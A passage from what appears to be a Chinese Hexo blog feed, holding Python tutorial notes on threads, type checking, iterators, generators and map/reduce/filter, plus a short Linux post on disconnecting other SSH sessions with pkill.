class="line">t.join()</span><br><span class="line">print(&apos;thread %s ended.&apos; % threading.current_thread().name)</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">thread MainThread is running...</span><br><span class="line">thread LoopThread is running...</span><br><span class="line">thread LoopThread &gt;&gt;&gt; 1</span><br><span class="line">thread LoopThread &gt;&gt;&gt; 2</span><br><span class="line">thread LoopThread &gt;&gt;&gt; 3</span><br><span class="line">thread LoopThread &gt;&gt;&gt; 4</span><br><span class="line">thread LoopThread &gt;&gt;&gt; 5</span><br><span class="line">thread LoopThread ended.</span><br><span class="line">thread MainThread ended.</span><br></pre></td></tr></table></figure><p>由于任何进程默认就会启动一个线程，我们把该线程称为主线程，主线程又可以启动新的线程，Python的<code>threading</code>模块有个<code>current_thread()</code>函数，它永远返回当前线程的实例。</p><h4 id="lock"><a href="#lock" class="headerlink" title="lock"></a>lock</h4><p>多线程 和 多进程最大的不同在于， 多进程中，同一个变量，各自有一份拷贝存在于每个进程中，互不影响。</p><h3 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a><a href="https://docs.python.org/3/library/functions.html" target="_blank" rel="noopener">内置函数</a></h3><h4 id="isinstance-数据类型检查"><a href="#isinstance-数据类型检查" class="headerlink" title="isinstance()   数据类型检查"></a>isinstance()   数据类型检查</h4><ul><li><p>数据类型检查可以用内置函数<code>isinstance()</code>实现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def my_abs(x):</span><br><span class="line">    if not isinstance(x, (int, float)):</span><br><span class="line">        raise TypeError(&apos;bad operand type&apos;)</span><br><span class="line">    if x &gt;= 0:</span><br><span class="line">        return x</span><br><span class="line">    else:</span><br><span class="line">        return -x</span><br></pre></td></tr></table></figure><p>可以使用<code>isinstance()</code>判断一个对象是否是<code>Iterable</code>对象：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from collections import Iterable</span><br><span class="line">&gt;&gt;&gt; isinstance([], Iterable)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><p>​</p></li></ul><h4 id="Type-判断对象类型"><a href="#Type-判断对象类型" class="headerlink" title="Type  判断对象类型"></a>Type  判断对象类型</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; type(abs)</span><br><span class="line">&lt;class &apos;builtin_function_or_method&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; type(a)</span><br><span class="line">&lt;class &apos;__main__.Animal&apos;&gt;</span><br></pre></td></tr></table></figure><p>但是<code>type()</code>函数返回的是什么类型呢？它返回对应的Class类型。如果我们要在<code>if</code>语句中判断，就需要比较两个变量的type类型是否相同：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; type(123)==type(456)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; type(123)==int</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; type(&apos;abc&apos;)==type(&apos;123&apos;)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; type(&apos;abc&apos;)==str</span><br><span class="line">True</span><br></pre></td></tr></table></figure><p>判断基本数据类型可以直接写<code>int</code>，<code>str</code>等，但如果要判断一个对象是否是函数怎么办？可以使用<code>types</code>模块中定义的常量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import types</span><br><span class="line">&gt;&gt;&gt; def fn():</span><br><span class="line">...     pass</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; type(fn)==types.FunctionType</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; type(abs)==types.BuiltinFunctionType</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; type(lambda x: x)==types.LambdaType</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; type((x for x in range(10)))==types.GeneratorType</span><br><span class="line">True</span><br></pre></td></tr></table></figure><h4 id="Dir-对象属性和方法"><a href="#Dir-对象属性和方法" class="headerlink" title="Dir  对象属性和方法"></a>Dir  对象属性和方法</h4><p>如果要获得一个对象的所有属性和方法，可以使用<code>dir()</code>函数，它返回一个包含字符串的list，比如，获得一个str对象的所有属性和方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; dir(&apos;ABC&apos;)</span><br><span class="line">[&apos;__add__&apos;, &apos;__class__&apos;,..., &apos;__subclasshook__&apos;, &apos;capitalize&apos;, &apos;casefold&apos;,..., &apos;zfill&apos;]</span><br></pre></td></tr></table></figure><p>类似<code>__xxx__</code>的属性和方法在Python中都是有特殊用途的，比如<code>__len__</code>方法返回长度。在Python中，如果你调用<code>len()</code>函数试图获取一个对象的长度，实际上，在<code>len()</code>函数内部，它自动去调用该对象的<code>__len__()</code>方法，所以，下面的代码是等价的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; len(&apos;ABC&apos;)</span><br><span class="line">3</span><br><span class="line">&gt;&gt;&gt; &apos;ABC&apos;.__len__()</span><br><span class="line">3</span><br></pre></td></tr></table></figure><p>自己写的类，如果也想用<code>len(myObj)</code>的话，就自己写一个<code>__len__()</code>方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class MyDog(object):</span><br><span class="line">...     def __len__(self):</span><br><span class="line">...         return 100</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; dog = MyDog()</span><br><span class="line">&gt;&gt;&gt; len(dog)</span><br><span class="line">100</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>强制踢出其他正在SSH登陆的用户</title>
      <link href="/2018/01/12/commands/Linux-%E5%BC%BA%E5%88%B6%E8%B8%A2%E5%87%BA%E5%85%B6%E4%BB%96%E6%AD%A3%E5%9C%A8SSH%E7%99%BB%E9%99%86%E7%9A%84%E7%94%A8%E6%88%B7/"/>
      <url>/2018/01/12/commands/Linux-%E5%BC%BA%E5%88%B6%E8%B8%A2%E5%87%BA%E5%85%B6%E4%BB%96%E6%AD%A3%E5%9C%A8SSH%E7%99%BB%E9%99%86%E7%9A%84%E7%94%A8%E6%88%B7/</url>
      
        <content type="html"><![CDATA[<p>​    在一些生产平台或者做安全审计的时候往往看到一大堆的用户SSH连接到同一台服务器，或者连接后没有正常关闭进程还驻留在系统内。限制SSH连接数与手动断开空闲连接也有必要之举，这里写出手动剔出其他用户的过程。</p><p><br><br><a id="more"></a></p><ol><li><p>查看正在系统登录的用户 w</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># w     </span></span><br><span class="line"> <span class="number">01</span>:<span class="number">53</span>:<span class="number">11</span> up <span class="number">42</span> days,  <span class="number">5</span>:<span class="number">51</span>,  <span class="number">3</span> users,  load average: <span class="number">0.00</span>, <span class="number">0.00</span>, <span class="number">0.00</span></span><br><span class="line">USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">root     pts/<span class="number">0</span>    <span class="number">58.56</span>.<span class="number">174.106</span>    <span class="number">01</span>:<span class="number">07</span>   <span class="number">45</span>:<span class="number">49</span>   <span class="number">0.00</span>s  <span class="number">0.00</span>s tailf /var/log/nginx/error.log</span><br><span class="line">root     pts/<span class="number">1</span>    <span class="number">124.133</span>.<span class="number">18.218</span>   <span class="number">01</span>:<span class="number">51</span>    <span class="number">0.00</span>s  <span class="number">0.01</span>s  <span class="number">0.00</span>s w</span><br><span class="line">root     pts/<span class="number">2</span>    <span class="number">58.56</span>.<span class="number">174.106</span>    <span class="number">00</span>:<span class="number">56</span>   <span class="number">26</span>:<span class="number">14</span>   <span class="number">0.05</span>s  <span class="number">0.05</span>s -bash</span><br></pre></td></tr></table></figure></li><li><p>查看自己登录的tty (who am i)</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># who am i </span></span><br><span class="line">root     pts/<span class="number">1</span>        Nov <span class="number">12</span> <span class="number">01</span>:<span class="number">51</span> (<span class="number">124.133</span>.<span class="number">18.218</span>)</span><br></pre></td></tr></table></figure><p><strong>注意查看Ip，自己可能使用多个tty,小心踢出重要会话</strong></p></li><li><p>踢出对方 pkill</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkill -kill -t  pts/<span class="number">0</span></span><br></pre></td></tr></table></figure></li><li><p>查看系统登录信息</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># pkill -kill -t  pts/0  </span></span><br><span class="line">[root@localhost ~]<span class="comment"># w</span></span><br><span class="line"> <span class="number">01</span>:<span class="number">53</span>:<span class="number">30</span> up <span class="number">42</span> days,  <span class="number">5</span>:<span class="number">51</span>,  <span class="number">2</span> users,  load average: <span class="number">0.00</span>, <span class="number">0.00</span>, <span class="number">0.00</span></span><br><span class="line">USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">root     pts/<span class="number">1</span>    <span class="number">124.133</span>.<span class="number">18.218</span>   <span class="number">01</span>:<span class="number">51</span>    <span class="number">0.00</span>s  <span class="number">0.01</span>s  <span class="number">0.00</span>s w</span><br><span class="line">root     pts/<span class="number">2</span>    <span class="number">58.56</span>.<span class="number">174.106</span>    <span class="number">00</span>:<span class="number">56</span>   <span class="number">26</span>:<span class="number">33</span>   <span class="number">0.05</span>s  <span class="number">0.05</span>s -bash</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> 命令 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Commands </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python-高级函数</title>
      <link href="/2018/01/12/gram/Python-%E9%AB%98%E7%BA%A7%E5%87%BD%E6%95%B0/"/>
      <url>/2018/01/12/gram/Python-%E9%AB%98%E7%BA%A7%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<ul><li>切片</li><li>迭代</li><li>列表生成器</li><li>生成器</li><li>高阶函数<ul><li>map</li><li>reduce</li><li>fliter</li><li>sorted</li><li>lambda</li><li>装饰器</li></ul></li></ul><a id="more"></a><p><br></p><h3 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; L[0:3]</span><br><span class="line">[&apos;Michael&apos;, &apos;Sarah&apos;, &apos;Tracy&apos;]</span><br></pre></td></tr></table></figure><p><code>L[0:3]</code>表示，从索引<code>0</code>开始取，直到索引<code>3</code>为止，但不包括索引<code>3</code>。即索引<code>0</code>，<code>1</code>，<code>2</code>，正好是3个元素。</p><p>记住倒数第一个元素的索引是<code>-1</code>。</p><p>切片操作十分有用。我们先创建一个0-99的数列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; L = list(range(100))</span><br><span class="line">&gt;&gt;&gt; L</span><br><span class="line">[0, 1, 2, 3, ..., 99]</span><br></pre></td></tr></table></figure><p>可以通过切片轻松取出某一段数列。比如前10个数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; L[:10]</span><br><span class="line">[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]</span><br></pre></td></tr></table></figure><p>后10个数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; L[-10:]</span><br><span class="line">[90, 91, 92, 93, 94, 95, 96, 97, 98, 99]</span><br></pre></td></tr></table></figure><h3 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h3><p>如果给定一个list或tuple，我们可以通过<code>for</code>循环来遍历这个list或tuple，这种遍历我们称为迭代（Iteration）。</p><p>在Python中，迭代是通过<code>for ... in</code>来完成的，而很多语言比如C语言，迭代list是通过下标完成的，比如Java代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (i=0; i&lt;list.length; i++) &#123;</span><br><span class="line">    n = list[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出，Python的<code>for</code>循环抽象程度要高于C的<code>for</code>循环，因为Python的<code>for</code>循环不仅可以用在list或tuple上，还可以作用在其他可迭代对象上。</p><p>list这种数据类型虽然有下标，但很多其他数据类型是没有下标的，但是，只要是可迭代对象，无论有无下标，都可以迭代，比如dict就可以迭代：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d = &#123;&apos;a&apos;: 1, &apos;b&apos;: 2, &apos;c&apos;: 3&#125;</span><br><span class="line">&gt;&gt;&gt; for key in d:</span><br><span class="line">...     print(key)</span><br><span class="line">...</span><br><span class="line">a</span><br><span class="line">c</span><br><span class="line">b</span><br></pre></td></tr></table></figure><p>因为dict的存储不是按照list的方式顺序排列，所以，迭代出的结果顺序很可能不一样。</p><p>默认情况下，dict迭代的是key。如果要迭代value，可以用<code>for value in d.values()</code>，如果要同时迭代key和value，可以用<code>for k, v in d.items()</code>。</p><h3 id="列表生成式"><a href="#列表生成式" class="headerlink" title="列表生成式  []"></a>列表生成式  []</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [x * x for x in range(1, 11)]</span><br><span class="line">[1, 4, 9, 16, 25, 36, 49, 64, 81, 100]</span><br></pre></td></tr></table></figure><p>还可以使用两层循环，可以生成全排列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [m + n for m in &apos;ABC&apos; for n in &apos;XYZ&apos;]</span><br><span class="line">[&apos;AX&apos;, &apos;AY&apos;, &apos;AZ&apos;, &apos;BX&apos;, &apos;BY&apos;, &apos;BZ&apos;, &apos;CX&apos;, &apos;CY&apos;, &apos;CZ&apos;]</span><br></pre></td></tr></table></figure><h3 id="生成器"><a href="#生成器" class="headerlink" title="生成器  ()"></a>生成器  ()</h3><p>创建一个包含100万个元素的列表，不仅占用很大的存储空间，如果我们仅仅需要访问前面几个元素，那后面绝大多数元素占用的空间都白白浪费了。</p><p>所以，如果列表元素可以按照某种算法推算出来，那我们是否可以在循环的过程中不断推算出后续的元素呢？这样就不必创建完整的list，从而节省大量的空间。</p><p><strong>在Python中，这种一边循环一边计算的机制，称为生成器：generator。</strong>  <strong>generator  相当于 元组</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; L = [x * x for x in range(10)]</span><br><span class="line">&gt;&gt;&gt; L</span><br><span class="line">[0, 1, 4, 9, 16, 25, 36, 49, 64, 81]</span><br><span class="line">&gt;&gt;&gt; g = (x * x for x in range(10))</span><br><span class="line">&gt;&gt;&gt; g</span><br><span class="line">&lt;generator object &lt;genexpr&gt; at 0x1022ef630&gt;</span><br></pre></td></tr></table></figure><p>创建<code>L</code>和<code>g</code>的区别仅在于最外层的<code>[]</code>和<code>()</code>，<code>L</code>是一个list，而<code>g</code>是一个generator。  </p><p>可以通过<code>next()</code>函数获得generator的下一个返回值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; next(g)</span><br><span class="line">0</span><br><span class="line">&gt;&gt;&gt; next(g)</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; next(g)</span><br><span class="line">4</span><br><span class="line">&gt;&gt;&gt; next(g)</span><br><span class="line">9</span><br><span class="line">&gt;&gt;&gt; next(g)</span><br><span class="line">16</span><br><span class="line">&gt;&gt;&gt; next(g)</span><br></pre></td></tr></table></figure><p>generator保存的是算法，每次调用<code>next(g)</code>，就计算出<code>g</code>的下一个元素的值，直到计算到最后一个元素，没有更多的元素时，抛出<code>StopIteration</code>的错误。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; g = (x * x for x in range(10))   // generator 存储计算</span><br><span class="line">&gt;&gt;&gt; for n in g:</span><br><span class="line">...     print(n)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>我们创建了一个generator后，基本上永远不会调用<code>next()</code>，而是通过<code>for</code>循环来迭代它，并且不需要关心<code>StopIteration</code>的错误。</p><h3 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h3><p>一类是集合数据类型，如<code>list</code>、<code>tuple</code>、<code>dict</code>、<code>set</code>、<code>str</code>等；</p><p>一类是<code>generator</code>，包括生成器和带<code>yield</code>的generator function。</p><p>这些可以直接作用于<code>for</code>循环的对象统称为可迭代对象：<code>Iterable</code>。  –&gt; 可迭代</p><p>可以使用<code>isinstance()</code>判断一个对象是否是<code>Iterable</code>对象：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from collections import Iterable</span><br><span class="line">&gt;&gt;&gt; isinstance([], Iterable)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance(&#123;&#125;, Iterable)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance(&apos;abc&apos;, Iterable)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance((x for x in range(10)), Iterable)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance(100, Iterable)</span><br><span class="line">False</span><br></pre></td></tr></table></figure><p>可以被<code>next()</code>函数调用并不断返回下一个值的对象称为迭代器：<code>Iterator</code>。  –&gt; 迭代器</p><p>可以使用<code>isinstance()</code>判断一个对象是否是<code>Iterator</code>对象：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from collections import Iterator</span><br><span class="line">&gt;&gt;&gt; isinstance((x for x in range(10)), Iterator)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance([], Iterator)</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; isinstance(&#123;&#125;, Iterator)</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; isinstance(&apos;abc&apos;, Iterator)</span><br><span class="line">False</span><br></pre></td></tr></table></figure><p>生成器都是<code>Iterator</code>对象，但<code>list</code>、<code>dict</code>、<code>str</code>虽然是<code>Iterable</code>，却不是<code>Iterator</code>。</p><p>这是因为Python的<code>Iterator</code>对象表示的是一个数据流，Iterator对象可以被<code>next()</code>函数调用并不断返回下一个数据，直到没有数据时抛出<code>StopIteration</code>错误。可以把这个数据流看做是一个有序序列，但我们却不能提前知道序列的长度，只能不断通过<code>next()</code>函数实现按需计算下一个数据，所以<code>Iterator</code>的计算是惰性的，只有在需要返回下一个数据时它才会计算。</p><p><code>Iterator</code>甚至可以表示一个无限大的数据流，例如全体自然数。而使用list是永远不可能存储全体自然数的。</p><p><strong>重点</strong> </p><p>凡是可作用于<code>for</code>循环的对象都是<code>Iterable</code>类型；</p><p>凡是可作用于<code>next()</code>函数的对象都是<code>Iterator</code>类型，它们表示一个惰性计算的序列；</p><p>集合数据类型如<code>list</code>、<code>dict</code>、<code>str</code>等是<code>Iterable</code>但不是<code>Iterator</code>，不过可以通过<code>iter()</code>函数获得一个<code>Iterator</code>对象。</p><p>Python的<code>for</code>循环本质上就是通过不断调用<code>next()</code>函数实现的，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for x in [1, 2, 3, 4, 5]:</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><p>实际上完全等价于：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 首先获得Iterator对象:</span><br><span class="line">it = iter([1, 2, 3, 4, 5])    // --&gt; iterator 迭代器</span><br><span class="line"># 循环:</span><br><span class="line">while True:</span><br><span class="line">    try:</span><br><span class="line">        # 获得下一个值:</span><br><span class="line">        x = next(it)</span><br><span class="line">    except StopIteration:</span><br><span class="line">        # 遇到StopIteration就退出循环</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><h3 id="高阶函数"><a href="#高阶函数" class="headerlink" title="高阶函数"></a>高阶函数</h3><h4 id="map-iterator"><a href="#map-iterator" class="headerlink" title="map    iterator"></a>map    iterator</h4><p><code>map()</code>函数接收两个参数，一个是函数，一个是<code>Iterable</code>，<code>map</code>将传入的函数依次作用到序列的每个元素，并把结果作为新的<code>Iterator</code>返回。</p><p>举例说明，比如我们有一个函数f(x)=x2，要把这个函数作用在一个list <code>[1, 2, 3, 4, 5, 6, 7, 8, 9]</code>上，就可以用<code>map()</code>实现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">            f(x) = x * x</span><br><span class="line"></span><br><span class="line">                  │</span><br><span class="line">                  │</span><br><span class="line">  ┌───┬───┬───┬───┼───┬───┬───┬───┐</span><br><span class="line">  │   │   │   │   │   │   │   │   │</span><br><span class="line">  ▼   ▼   ▼   ▼   ▼   ▼   ▼   ▼   ▼</span><br><span class="line"></span><br><span class="line">[ 1   2   3   4   5   6   7   8   9 ]</span><br><span class="line"></span><br><span class="line">  │   │   │   │   │   │   │   │   │</span><br><span class="line">  │   │   │   │   │   │   │   │   │</span><br><span class="line">  ▼   ▼   ▼   ▼   ▼   ▼   ▼   ▼   ▼</span><br><span class="line"></span><br><span class="line">[ 1   4   9  16  25  36  49  64  81 ]</span><br></pre></td></tr></table></figure><p>现在，我们用Python代码实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def f(x):</span><br><span class="line">...     return x * x</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; r = map(f, [1, 2, 3, 4, 5, 6, 7, 8, 9])</span><br><span class="line">&gt;&gt;&gt; list(r)</span><br><span class="line">[1, 4, 9, 16, 25, 36, 49, 64, 81]    --&gt; 形成list</span><br></pre></td></tr></table></figure><p><code>map()</code>传入的第一个参数是<code>f</code>，即函数对象本身。由于结果<code>r</code>是一个<code>Iterator</code>，<code>Iterator</code>是惰性序列，因此通过<code>list()</code>函数让它把整个序列都计算出来并返回一个list。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; next(r)</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; next(r)</span><br><span class="line">4</span><br><span class="line">&gt;&gt;&gt; next(r)</span><br><span class="line">9</span><br><span class="line">&gt;&gt;&gt; next(r)    --&gt; 显示;</span><br><span class="line">16</span><br></pre></td></tr></table></figure><h4 id="reduce-1-2-3-4-5"><a href="#reduce-1-2-3-4-5" class="headerlink" title="reduce    ((((1+2)+3)+4)+5)"></a>reduce    ((((1+2)+3)+4)+5)</h4><p> <code>reduce</code>把一个函数作用在一个序列<code>[x1, x2, x3, ...]</code>上，这个函数必须接收两个参数，<code>reduce</code>把结果继续和序列的下一个元素做累积计算，其效果就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reduce(f, [x1, x2, x3, x4]) = f(f(f(x1, x2), x3), x4)  // --&gt; 计算1 2 将1 2 作为 ARG1 再次输入</span><br></pre></td></tr></table></figure><p>比方说对一个序列求和，就可以用<code>reduce</code>实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from functools import reduce</span><br><span class="line">&gt;&gt;&gt; def add(x, y):</span><br><span class="line">...     return x + y</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; reduce(add, [1, 3, 5, 7, 9])</span><br><span class="line">25</span><br></pre></td></tr></table></figure><p>此求和运算 可以直接用Python内建函数<code>sum()</code>，没必要动用<code>reduce</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reduce(lambda x, y: x+y, [1, 2, 3, 4, 5]) calculates  ((((1+2)+3)+4)+5).</span><br></pre></td></tr></table></figure><h4 id="filter-过滤序列"><a href="#filter-过滤序列" class="headerlink" title="filter 过滤序列"></a>filter 过滤序列</h4><p><code>filter()</code>把传入的函数依次作用于每个元素，然后根据返回值是<code>True</code>还是<code>False</code>决定保留还是丢弃该元素。</p><p>例如，在一个list中，删掉偶数，只保留奇数，可以这么写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def is_odd(n):</span><br><span class="line">    return n % 2 == 1</span><br><span class="line"></span><br><span class="line">list(filter(is_odd, [1, 2, 4, 5, 6, 9, 10, 15]))</span><br><span class="line"># 结果: [1, 5, 9, 15]</span><br></pre></td></tr></table></figure><p>把一个序列中的空字符串删掉，可以这么写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def not_empty(s):</span><br><span class="line">    return s and s.strip()</span><br><span class="line"></span><br><span 